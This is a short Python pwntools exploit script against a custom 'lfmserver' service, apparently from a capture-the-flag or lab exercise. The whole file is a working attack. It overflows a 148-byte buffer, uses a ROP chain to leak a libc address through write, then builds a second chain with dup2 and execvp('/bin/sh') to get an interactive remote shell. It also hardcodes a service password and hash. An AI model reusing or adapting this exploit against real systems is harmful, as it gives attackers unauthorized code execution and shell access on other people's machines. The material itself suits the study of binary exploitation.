from pwn import *
'''
0x0000000000405c4b: pop rdi; ret;
'''
pop_rdi = p64(0x0000000000405c4b)
'''
0x0000000000405c49: pop rsi; pop r15; ret;
'''
pop_rsi_r15 = p64(0x0000000000405c49)
e = ELF("lfmserver", checksec = False)
write = p64(e.plt['write'])
socket = p64(e.got['socket'])
payload = "A" * 148
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + socket + "junkjunk"
payload += write
payload = urlencode(payload)
req = "CHECK /convert.php%00{}LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nb56a569c6162f6f04ea71e581beadf68\n".format(payload)
r = remote("localhost", 8888)
r.send(req)
r.recvlines(4)
r.recv(1)
socket_libc = u64(r.recv(8))
log.success("Leaked socket@libc: {}".format(hex(socket_libc)))
r.close()
libc = ELF("libc-2.28.so", checksec = False)
execvp = libc.symbols['execvp']
socket = libc.symbols['socket']
diff = socket - execvp
execvp_libc = socket_libc - diff
log.info("Execvp@libc: {}".format(hex(execvp_libc)))
binsh = list(libc.search("/bin/sh\x00"))[0]
diff = socket - binsh
binsh_libc = socket_libc - diff
log.info("/bin/sh address: {}".format(hex(binsh_libc)))
dup2 = p64(e.plt['dup2'])
payload = "A" * 148
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + p64(0x0) + "junkjunk"
payload += dup2
# dup2(6, STDIN)

payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + p64(0x1) + "junkjunk"
payload += dup2
# dup2(6, STDOUT)
payload += pop_rdi + p64(binsh_libc)
payload += pop_rsi_r15 + p64(0x0) + "junkjunk"
payload += p64(execvp_libc)
# execvp("/bin/sh", NULL)
payload = urlencode(payload)
req = "CHECK /convert.php%00{}LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nb56a569c6162f6f04ea71e581beadf68\n".format(payload)
r = remote("localhost", 8888)

r.send(req)
r.interactive()
r.close()
